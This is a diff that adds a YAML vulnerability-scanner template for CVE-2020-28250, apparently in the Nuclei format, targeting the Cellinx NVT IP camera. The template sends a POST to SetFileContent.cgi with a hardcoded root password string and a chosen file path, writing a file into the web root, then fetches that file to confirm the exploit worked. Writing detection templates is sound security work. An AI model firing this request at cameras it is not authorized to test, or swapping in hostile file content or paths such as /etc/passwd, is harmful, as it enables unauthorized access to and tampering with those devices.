@@ -1,0 +1,49 @@
+id: cve-2020-28250
+info:
+  name: Cellinx NVT SetFileContent.cgi Arbitrary File Creation
+  author: ProjectDiscoveryAI
+  severity: critical
+  description: |
+    The Cellinx NVT IP PTZ camera, version 5.0.0.014 B.EST 2019-09-05, contains a vulnerability in SetFileContent.cgi that allows arbitrary file creation, including overwriting critical files such as /etc/passwd.
+  reference:
+    - https://github.com/summtime/CVE/tree/master/CVE-2020-28250
+    - https://www.ispyconnect.com/camera/cellinx
+  tags:
+    - file-creation
+    - critical
+
+variables:
+  random_file: "{{rand_base(6)}}"
+  file_content: "testcontent"
+
+http:
+  - raw:
+      - |
+        POST /cgi-bin/SetFileContent.cgi?USER=root&PWD=D1D1D1D1D1D1D1D1D1D1D1D1A2A2B0A1D1D1D1D1D1D1D1D1D1D1D1D1D1B8D1&PATH=/etc/html/{{random_file}}.js HTTP/1.1
+        Host: {{Hostname}}
+        Content-Type: application/x-www-form-urlencoded
+
+        {{file_content}}
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        words:
+          - "{{random_file}}"
+        part: body
+
+  - raw:
+      - |
+        GET /local/{{random_file}}.js HTTP/1.1
+        Host: {{Hostname}}
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        words:
+          - "{{random_file}}"
+        part: body
